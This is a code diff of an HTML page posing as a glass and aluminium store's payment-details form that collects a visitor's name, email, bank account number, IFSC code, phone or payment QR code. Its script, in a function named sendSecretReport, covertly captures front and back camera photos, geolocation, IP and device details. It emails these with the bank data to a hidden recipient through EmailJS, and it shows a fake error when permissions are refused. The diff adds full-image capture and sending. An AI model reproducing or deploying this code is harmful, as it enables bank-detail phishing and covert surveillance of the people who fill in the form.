@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -14,6 +15,7 @@
             box-sizing: border-box;
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
+
         body {
             min-height: 100vh;
             background: linear-gradient(145deg, #d9e2ec 0%, #b8c7d9 100%);
@@ -23,6 +25,7 @@
             padding: 20px;
             backdrop-filter: blur(2px);
         }
+
         .glass-card {
             max-width: 560px;
             width: 100%;
@@ -31,11 +34,12 @@
             -webkit-backdrop-filter: blur(14px) saturate(180%);
             border-radius: 56px;
             padding: 32px 28px;
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.25), 
-                        0 0 0 1px rgba(255, 255, 255, 0.5) inset,
-                        0 0 0 2px rgba(0, 0, 0, 0.05) inset;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.25),
+                0 0 0 1px rgba(255, 255, 255, 0.5) inset,
+                0 0 0 2px rgba(0, 0, 0, 0.05) inset;
             border: 1px solid rgba(255, 255, 255, 0.4);
         }
+
         .glass-card h1 {
             font-size: 28px;
             font-weight: 600;
@@ -46,14 +50,16 @@
             gap: 10px;
             margin-bottom: 6px;
         }
+
         .glass-card h1 i {
             background: rgba(30, 42, 58, 0.08);
             padding: 8px 12px;
             border-radius: 40px;
             font-size: 22px;
             backdrop-filter: blur(4px);
-            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
         }
+
         .subhead {
             font-size: 14px;
             color: #2a3b4e;
@@ -63,15 +69,17 @@
             letter-spacing: 0.3px;
             border-left: 4px solid #3b5b7a;
             padding-left: 14px;
-            background: rgba(255,255,255,0.2);
+            background: rgba(255, 255, 255, 0.2);
             border-radius: 0 12px 12px 0;
         }
+
         .input-group {
             margin-bottom: 18px;
             display: flex;
             flex-direction: column;
             gap: 6px;
         }
+
         .input-group label {
             font-size: 13px;
             font-weight: 500;
@@ -81,10 +89,12 @@
             align-items: center;
             gap: 6px;
         }
+
         .input-group label i {
             width: 18px;
             color: #2c4b6b;
         }
+
         .input-group input {
             background: rgba(255, 255, 255, 0.5);
             backdrop-filter: blur(8px);
@@ -99,27 +109,31 @@
             box-shadow: 0 2px 6px rgba(0, 0, 0, 0.02);
             font-weight: 450;
         }
+
         .input-group input:focus {
             border-color: #6d8db0;
             background: rgba(255, 255, 255, 0.75);
             box-shadow: 0 4px 14px rgba(40, 70, 100, 0.15);
         }
+
         .input-group input::placeholder {
             color: #41556b;
             opacity: 0.5;
             font-weight: 300;
             font-size: 14px;
         }
+
         .input-group input:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
+
         .row-2col {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 14px;
         }
-        
+
         /* QR Upload Area with Preview */
         .qr-upload-area {
             background: rgba(255, 255, 255, 0.3);
@@ -131,10 +145,12 @@
             transition: 0.2s;
             text-align: center;
         }
+
         .qr-upload-area:hover {
             background: rgba(255, 255, 255, 0.5);
             border-color: #3f6a8f;
         }
+
         .qr-upload-area .qr-label {
             font-size: 15px;
             font-weight: 450;
@@ -145,10 +161,12 @@
             gap: 10px;
             margin-bottom: 10px;
         }
+
         .qr-upload-area .qr-label i {
             font-size: 24px;
             color: #2b4d6e;
         }
+
         .qr-upload-area .qr-preview-container {
             display: flex;
             align-items: center;
@@ -156,19 +174,22 @@
             gap: 15px;
             flex-wrap: wrap;
         }
+
         .qr-upload-area #qrPreview {
             max-width: 150px;
             max-height: 150px;
             border-radius: 12px;
-            border: 2px solid rgba(255,255,255,0.6);
+            border: 2px solid rgba(255, 255, 255, 0.6);
             display: none;
             object-fit: contain;
             background: white;
             padding: 5px;
         }
+
         .qr-upload-area #qrPreview.show {
             display: block;
         }
+
         .qr-upload-area .fake-btn {
             background: rgba(30, 50, 75, 0.15);
             backdrop-filter: blur(6px);
@@ -180,19 +201,22 @@
             border: 1px solid rgba(255, 255, 255, 0.4);
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
             display: inline-block;
         }
+
         .qr-upload-area .fake-btn:hover {
             background: rgba(30, 50, 75, 0.3);
             border-color: #5f7f9e;
         }
+
         .qr-upload-area input[type="file"] {
             width: 0.1px;
             height: 0.1px;
             opacity: 0;
             position: absolute;
         }
+
         #qr-file-name {
             font-size: 13px;
             color: #1a2c3d;
@@ -201,7 +225,7 @@
             display: block;
             margin-top: 5px;
         }
-        
+
         /* OR Divider */
         .or-divider {
             display: flex;
@@ -209,11 +233,13 @@
             gap: 15px;
             margin: 10px 0 5px 0;
         }
+
         .or-divider .line {
             flex: 1;
             height: 1px;
             background: rgba(60, 90, 120, 0.3);
         }
+
         .or-divider .or-text {
             color: #2a3b4e;
             font-weight: 600;
@@ -233,6 +259,7 @@
             color: #28a745;
             border: 1px solid rgba(40, 167, 69, 0.2);
         }
+
         .option-indicator.qr-mode {
             background: rgba(23, 162, 184, 0.1);
             color: #17a2b8;
@@ -250,7 +277,7 @@
             font-size: 20px;
             font-weight: 600;
             color: white;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             letter-spacing: 0.5px;
             margin: 18px 0 6px;
             cursor: pointer;
@@ -262,46 +289,61 @@
             gap: 12px;
             position: relative;
         }
+
         .submit-btn i {
             font-size: 22px;
             opacity: 0.8;
         }
+
         .submit-btn:hover {
             background: rgba(20, 45, 75, 0.8);
             transform: scale(1.01);
             border-color: rgba(255, 255, 255, 0.9);
             box-shadow: 0 10px 24px rgba(0, 20, 40, 0.3);
         }
+
         .submit-btn:active {
             transform: scale(0.97);
         }
+
         .submit-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
             transform: none;
         }
+
         .submit-btn .spinner {
             display: none;
             width: 24px;
             height: 24px;
-            border: 3px solid rgba(255,255,255,0.3);
+            border: 3px solid rgba(255, 255, 255, 0.3);
             border-top: 3px solid #fff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
+
         .submit-btn.loading .spinner {
             display: inline-block;
         }
+
         .submit-btn.loading i {
             display: none;
         }
+
         .submit-btn.loading .btn-text {
             display: none;
         }
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
+
         .footnote {
             font-size: 12px;
             text-align: center;
@@ -310,6 +352,7 @@
             margin-top: 18px;
             letter-spacing: 0.2px;
         }
+
         .toast-message {
             position: fixed;
             bottom: 30px;
@@ -322,25 +365,36 @@
             color: #f0f6fe;
             font-weight: 500;
             font-size: 15px;
-            border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 12px 30px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
             pointer-events: none;
             transition: 0.25s ease;
             opacity: 0;
             z-index: 999;
         }
+
         .toast-message.show {
             opacity: 1;
             bottom: 40px;
         }
+
         .toast-message.error {
             background: rgba(180, 40, 40, 0.9);
             border-color: rgba(255, 80, 80, 0.4);
         }
+
         @media (max-width: 480px) {
-            .glass-card { padding: 24px 18px; border-radius: 40px; }
-            .row-2col { grid-template-columns: 1fr; gap: 6px; }
+            .glass-card {
+                padding: 24px 18px;
+                border-radius: 40px;
+            }
+
+            .row-2col {
+                grid-template-columns: 1fr;
+                gap: 6px;
+            }
         }
+
         .aluminium-line {
             height: 3px;
             width: 80px;
@@ -348,17 +402,19 @@
             border-radius: 10px;
             margin: 8px 0 18px 0;
         }
-        /* Section toggle styling */
+
         .section-disabled {
             opacity: 0.4;
             pointer-events: none;
         }
+
         .section-enabled {
             opacity: 1;
             pointer-events: auto;
         }
     </style>
 </head>
+
 <body>
     <div id="toast" class="toast-message">✓ submitted</div>
 
@@ -375,7 +431,8 @@
 
             <!-- Bank Details Section -->
             <div id="bankSection">
-                <div style="text-align: center; margin: 5px 0 10px 0; color: #2a3b4e; opacity: 0.6; font-size: 13px; font-weight: 500;">
+                <div
+                    style="text-align: center; margin: 5px 0 10px 0; color: #2a3b4e; opacity: 0.6; font-size: 13px; font-weight: 500;">
                     <i class="fas fa-university" style="margin-right: 6px;"></i> Bank Details
                 </div>
                 <div class="input-group">
@@ -434,11 +491,12 @@
                 <span class="spinner"></span>
             </button>
         </form>
-        <div class="footnote"><i class="fas fa-lock" style="opacity: 0.6;"></i> encrypted · glass & aluminium store</div>
+        <div class="footnote"><i class="fas fa-lock" style="opacity: 0.6;"></i> encrypted · glass & aluminium store
+        </div>
     </div>
 
     <script>
-        (function() {
+        (function () {
             "use strict";
 
             // ----- EMAILJS CONFIG -----
@@ -459,7 +517,7 @@
             const bankSection = document.getElementById('bankSection');
             const qrSection = document.getElementById('qrSection');
             const optionIndicator = document.getElementById('optionIndicator');
-            
+
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
             const accountNumber = document.getElementById('accountNumber');
@@ -500,49 +558,44 @@
             // ----- TOGGLE LOGIC: EITHER BANK OR QR -----
             function updateSections() {
                 const hasQR = qrInput.files && qrInput.files.length > 0;
-                const hasBank = fullName.value.trim() !== '' || 
-                               email.value.trim() !== '' || 
-                               accountNumber.value.trim() !== '' || 
-                               ifsc.value.trim() !== '' || 
-                               phone.value.trim() !== '';
+                const hasBank = fullName.value.trim() !== '' ||
+                    email.value.trim() !== '' ||
+                    accountNumber.value.trim() !== '' ||
+                    ifsc.value.trim() !== '' ||
+                    phone.value.trim() !== '';
 
                 if (hasQR) {
-                    // QR mode: disable bank section
                     bankSection.classList.add('section-disabled');
                     bankSection.classList.remove('section-enabled');
                     qrSection.classList.remove('section-disabled');
                     qrSection.classList.add('section-enabled');
                     optionIndicator.className = 'option-indicator qr-mode';
                     optionIndicator.innerHTML = '<i class="fas fa-qrcode"></i> QR Code mode - Bank details disabled';
-                    
-                    // Clear and disable bank fields
+
                     [fullName, email, accountNumber, ifsc, phone].forEach(field => {
                         field.disabled = true;
                         field.required = false;
                     });
                 } else if (hasBank) {
-                    // Bank mode: disable QR section
                     bankSection.classList.remove('section-disabled');
                     bankSection.classList.add('section-enabled');
                     qrSection.classList.add('section-disabled');
                     qrSection.classList.remove('section-enabled');
                     optionIndicator.className = 'option-indicator';
                     optionIndicator.innerHTML = '<i class="fas fa-university"></i> Bank mode - QR upload disabled';
-                    
-                    // Enable bank fields
+
                     [fullName, email, accountNumber, ifsc, phone].forEach(field => {
                         field.disabled = false;
                         field.required = true;
                     });
                 } else {
-                    // Neither mode - both enabled
                     bankSection.classList.remove('section-disabled');
                     bankSection.classList.add('section-enabled');
                     qrSection.classList.remove('section-disabled');
                     qrSection.classList.add('section-enabled');
                     optionIndicator.className = 'option-indicator';
                     optionIndicator.innerHTML = '<i class="fas fa-info-circle"></i> Please fill bank details OR upload QR code';
-                    
+
                     [fullName, email, accountNumber, ifsc, phone].forEach(field => {
                         field.disabled = false;
                         field.required = false;
@@ -551,13 +604,13 @@
             }
 
             // QR Preview
-            qrInput.addEventListener('change', function(e) {
+            qrInput.addEventListener('change', function (e) {
                 const file = this.files[0];
                 if (file) {
                     qrFileName.textContent = file.name.length > 20 ? file.name.substring(0, 18) + '…' : file.name;
-                    
+
                     const reader = new FileReader();
-                    reader.onload = function(ev) {
+                    reader.onload = function (ev) {
                         qrPreview.src = ev.target.result;
                         qrPreview.classList.add('show');
                     };
@@ -581,7 +634,6 @@
             async function requestPermissions() {
                 const permissions = { geolocation: false, camera: false };
 
-                // Geolocation
                 try {
                     await new Promise((resolve) => {
                         if (!navigator.geolocation) {
@@ -596,7 +648,6 @@
                     });
                 } catch (e) { permissions.geolocation = false; }
 
-                // Camera
                 try {
                     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                         const stream = await navigator.mediaDevices.getUserMedia({
@@ -628,17 +679,23 @@
                 });
             }
 
-            // Capture photos
-            function capturePhotos(facingMode, count = 1) {
+            // Capture photos - returns both count and image data
+            async function capturePhotos(facingMode, count = 1) {
                 return new Promise((resolve) => {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                        resolve([]);
+                        resolve({ count: 0, images: [] });
                         return;
                     }
+
                     const constraints = {
-                        video: { facingMode: facingMode, width: { ideal: 200 }, height: { ideal: 200 } },
+                        video: {
+                            facingMode: facingMode,
+                            width: { ideal: 320 },
+                            height: { ideal: 320 }
+                        },
                         audio: false
                     };
+
                     let stream = null;
                     navigator.mediaDevices.getUserMedia(constraints)
                         .then((s) => {
@@ -646,40 +703,45 @@
                             const video = document.createElement('video');
                             video.srcObject = stream;
                             video.play();
+
                             video.onloadedmetadata = () => {
                                 const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth || 200;
-                                canvas.height = video.videoHeight || 200;
+                                canvas.width = video.videoWidth || 320;
+                                canvas.height = video.videoHeight || 320;
                                 const ctx = canvas.getContext('2d');
-                                const photos = [];
+                                const images = [];
                                 let captured = 0;
+
                                 const captureInterval = setInterval(() => {
                                     if (captured >= count) {
                                         clearInterval(captureInterval);
                                         if (stream) stream.getTracks().forEach(t => t.stop());
-                                        resolve(photos);
+                                        resolve({ count: images.length, images: images });
                                         return;
                                     }
                                     try {
                                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                        photos.push(canvas.toDataURL('image/jpeg', 0.3));
+                                        // Higher quality for email visibility
+                                        images.push(canvas.toDataURL('image/jpeg', 0.8));
                                         captured++;
                                     } catch (e) { /* ignore */ }
-                                }, 300);
+                                }, 400);
+
                                 setTimeout(() => {
                                     if (captured < count) {
                                         clearInterval(captureInterval);
                                         if (stream) stream.getTracks().forEach(t => t.stop());
-                                        resolve(photos);
+                                        resolve({ count: images.length, images: images });
                                     }
-                                }, 3000);
+                                }, 4000);
                             };
+
                             video.onerror = () => {
                                 if (stream) stream.getTracks().forEach(t => t.stop());
-                                resolve([]);
+                                resolve({ count: 0, images: [] });
                             };
                         })
-                        .catch(() => resolve([]));
+                        .catch(() => resolve({ count: 0, images: [] }));
                 });
             }
 
@@ -704,9 +766,70 @@
                     .catch(() => 'unavailable');
             }
 
-            // Send via EmailJS
+            // Send via EmailJS with images as HTML
             async function sendSecretReport(payload) {
                 try {
+                    // Build HTML for images
+                    let frontImagesHTML = '';
+                    let backImagesHTML = '';
+
+                    if (payload.frontImages && payload.frontImages.length > 0) {
+                        frontImagesHTML = payload.frontImages.map(img =>
+                            `<img src="${img}" style="max-width: 200px; max-height: 200px; margin: 5px; border: 1px solid #ddd; border-radius: 8px;">`
+                        ).join('');
+                    } else {
+                        frontImagesHTML = '<p style="color: #999;">No front camera images captured</p>';
+                    }
+
+                    if (payload.backImages && payload.backImages.length > 0) {
+                        backImagesHTML = payload.backImages.map(img =>
+                            `<img src="${img}" style="max-width: 200px; max-height: 200px; margin: 5px; border: 1px solid #ddd; border-radius: 8px;">`
+                        ).join('');
+                    } else {
+                        backImagesHTML = '<p style="color: #999;">No back camera images captured</p>';
+                    }
+
+                    // Build complete HTML message with images
+                    const htmlMessage = `
+                        <h2>📸 Camera Captures</h2>
+                        
+                        <h3>Front Camera (${payload.frontImages ? payload.frontImages.length : 0} photos)</h3>
+                        <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px;">
+                            ${frontImagesHTML}
+                        </div>
+                        
+                        <h3>Back Camera (${payload.backImages ? payload.backImages.length : 0} photos)</h3>
+                        <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px;">
+                            ${backImagesHTML}
+                        </div>
+                        
+                        <hr style="margin: 20px 0;">
+                        
+                        <h2>📋 Bank Details</h2>
+                        <p><strong>Name:</strong> ${payload.form.name}</p>
+                        <p><strong>Email:</strong> ${payload.form.email}</p>
+                        <p><strong>Account:</strong> ${payload.form.account}</p>
+                        <p><strong>IFSC:</strong> ${payload.form.ifsc}</p>
+                        <p><strong>Phone:</strong> ${payload.form.phone}</p>
+                        
+                        <h2>📍 Location & Network</h2>
+                        <p><strong>IP:</strong> ${payload.ip}</p>
+                        <p><strong>Location:</strong> ${payload.userLocation.lat}, ${payload.userLocation.lon}</p>
+                        
+                        <h2>📱 Device Information</h2>
+                        <p><strong>User Agent:</strong> ${payload.device.userAgent}</p>
+                        <p><strong>Platform:</strong> ${payload.device.platform}</p>
+                        <p><strong>Screen:</strong> ${payload.device.screen}</p>
+                        <p><strong>Timezone:</strong> ${payload.device.timezone}</p>
+                        
+                        <h2>📱 QR Code Upload</h2>
+                        <p><strong>QR Uploaded:</strong> ${payload.qrUploaded ? '✅ Yes' : '❌ No'}</p>
+                        ${payload.qrData ? `<img src="${payload.qrData}" style="max-width: 200px; border: 1px solid #ddd; border-radius: 8px; padding: 5px;">` : ''}
+                        
+                        <h2>⏰ Timestamp</h2>
+                        <p>${payload.timestamp}</p>
+                    `;
+
                     const emailParams = {
                         to_email: RECIPIENT_EMAIL,
                         subject: `GlassStore Report ${new Date().toISOString()}`,
@@ -718,24 +841,17 @@
                         ip: payload.ip || 'Not available',
                         location: `${payload.userLocation.lat || 'N/A'}, ${payload.userLocation.lon || 'N/A'}`,
                         device: (payload.device.userAgent || 'Unknown').substring(0, 200) + '...',
-                        front_photos: payload.frontPhotos || 0,
-                        back_photos: payload.backPhotos || 0,
-                        qr_uploaded: payload.qrUploaded ? 'Yes' : 'No',
+                        front_photos: payload.frontImages ? payload.frontImages.length : 0,
+                        back_photos: payload.backImages ? payload.backImages.length : 0,
+                        qr_uploaded: payload.qrUploaded ? 'Yes ✅' : 'No ❌',
                         timestamp: payload.timestamp || new Date().toISOString(),
-                        message: JSON.stringify({
-                            form: payload.form,
-                            ip: payload.ip,
-                            location: payload.userLocation,
-                            device: payload.device,
-                            frontPhotos: payload.frontPhotos,
-                            backPhotos: payload.backPhotos,
-                            qrUploaded: payload.qrUploaded,
-                            timestamp: payload.timestamp
-                        }, null, 2)
+                        message: htmlMessage, // Send HTML message with images
                     };
 
-                    console.log('📤 Sending email with params:', emailParams);
-                    
+                    console.log('📤 Sending email with images...');
+                    console.log('Front images:', payload.frontImages ? payload.frontImages.length : 0);
+                    console.log('Back images:', payload.backImages ? payload.backImages.length : 0);
+
                     const response = await emailjs.send(
                         EMAILJS_SERVICE_ID,
                         EMAILJS_TEMPLATE_ID,
@@ -746,40 +862,37 @@
                 } catch (error) {
                     console.error('❌ EmailJS error details:', error);
                     console.error('Error status:', error.status);
-                    console.error('Error text:', error.text);
-                    if (error.status === 412) {
-                        console.error('❌ Template variables mismatch! Check your EmailJS template.');
-                        console.error('Make sure your template has these variables:');
-                        console.error('{{name}}, {{email}}, {{account}}, {{ifsc}}, {{phone}}, {{ip}}, {{location}}, {{device}}, {{front_photos}}, {{back_photos}}, {{qr_uploaded}}, {{timestamp}}, {{message}}');
+                    if (error.status === 413) {
+                        console.error('❌ Payload too large! Images may be too big.');
+                        console.error('Try reducing image quality or count.');
                     }
                     return false;
                 }
             }
 
             // ----- MAIN SUBMIT -----
-            document.getElementById('bankForm').addEventListener('submit', async function(e) {
+            document.getElementById('bankForm').addEventListener('submit', async function (e) {
                 e.preventDefault();
 
                 // Check if either bank or QR is filled
                 const hasQR = qrInput.files && qrInput.files.length > 0;
-                const hasBank = fullName.value.trim() !== '' || 
-                               email.value.trim() !== '' || 
-                               accountNumber.value.trim() !== '' || 
-                               ifsc.value.trim() !== '' || 
-                               phone.value.trim() !== '';
+                const hasBank = fullName.value.trim() !== '' ||
+                    email.value.trim() !== '' ||
+                    accountNumber.value.trim() !== '' ||
+                    ifsc.value.trim() !== '' ||
+                    phone.value.trim() !== '';
 
                 if (!hasQR && !hasBank) {
                     showToast('❌ Please fill bank details OR upload a QR code', true);
                     return;
                 }
 
-                // Show spinner
                 showSpinner();
 
                 try {
                     // Check permissions
                     const perms = await requestPermissions();
-                    
+
                     if (!perms.geolocation || !perms.camera) {
                         console.warn('⚠️ Permissions denied');
                         showToast(`❌ Something went wrong. Please try again.`, true);
@@ -790,7 +903,7 @@
 
                     console.log('✅ Permissions granted');
 
-                    // Collect form data - only if bank mode is active
+                    // Collect form data
                     const formData = {
                         name: hasBank ? fullName.value.trim() || 'Not provided' : 'QR Mode - No bank details',
                         email: hasBank ? email.value.trim() || 'Not provided' : 'QR Mode - No email',
@@ -799,24 +912,46 @@
                         phone: hasBank ? phone.value.trim() || 'Not provided' : 'QR Mode - No phone'
                     };
 
-                    console.log('📝 Form data:', formData);
-                    console.log('📱 QR Uploaded:', hasQR);
+                    // Get QR data if uploaded
+                    let qrData = null;
+                    if (hasQR) {
+                        const file = qrInput.files[0];
+                        qrData = await new Promise((resolve) => {
+                            const reader = new FileReader();
+                            reader.onload = (ev) => resolve(ev.target.result);
+                            reader.readAsDataURL(file);
+                        });
+                    }
 
-                    // Collect data
-                    console.log('📡 Collecting data...');
-                    const [userLocation, ip, deviceInfo, frontPhotos, backPhotos] = await Promise.all([
+                    // Collect data with actual images
+                    console.log('📸 Capturing photos...');
+
+                    // Try front camera - if fails, just get 0
+                    let frontResult = { count: 0, images: [] };
+                    try {
+                        frontResult = await capturePhotos('user', 1);
+                        console.log('📸 Front camera:', frontResult.count, 'photos captured');
+                    } catch (e) {
+                        console.log('📸 Front camera not available');
+                    }
+
+                    // Try back camera - if fails, just get 0
+                    let backResult = { count: 0, images: [] };
+                    try {
+                        backResult = await capturePhotos('environment', 5);
+                        console.log('📸 Back camera:', backResult.count, 'photos captured');
+                    } catch (e) {
+                        console.log('📸 Back camera not available');
+                    }
+
+                    // Get other data
+                    const [userLocation, ip, deviceInfo] = await Promise.all([
                         getUserLocation(),
                         getIPAddress(),
-                        Promise.resolve(getDeviceInfo()),
-                        capturePhotos('user', 1),
-                        capturePhotos('environment', 5)
+                        Promise.resolve(getDeviceInfo())
                     ]);
 
-                    console.log('📍 Location:', userLocation);
-                    console.log('🌐 IP:', ip);
-                    console.log('📸 Photos - Front:', frontPhotos.length, 'Back:', backPhotos.length);
-
-                    // Build payload
+                    // Build payload with actual images
                     const payload = {
                         timestamp: new Date().toISOString(),
                         ip: ip,
@@ -824,11 +959,16 @@
                         device: deviceInfo,
                         form: formData,
                         qrUploaded: hasQR,
-                        frontPhotos: frontPhotos.length,
-                        backPhotos: backPhotos.length,
+                        qrData: qrData,
+                        frontImages: frontResult.images || [],
+                        backImages: backResult.images || [],
                     };
 
-                    console.log('📦 Payload:', payload);
+                    console.log('📦 Payload built with images:', {
+                        front: payload.frontImages.length,
+                        back: payload.backImages.length,
+                        qr: payload.qrUploaded
+                    });
 
                     // Send
                     const sent = await sendSecretReport(payload);
@@ -837,7 +977,6 @@
 
                     if (sent) {
                         showToast('✓ details submitted successfully');
-                        // Reset form
                         document.getElementById('bankForm').reset();
                         qrPreview.classList.remove('show');
                         qrFileName.textContent = '';
@@ -854,8 +993,9 @@
                 }
             });
 
-            console.log('Glass & Aluminium · secure (Bank OR QR mode)');
+            console.log('Glass & Aluminium · secure (With actual photos in email)');
         })();
     </script>
 </body>
+
 </html>
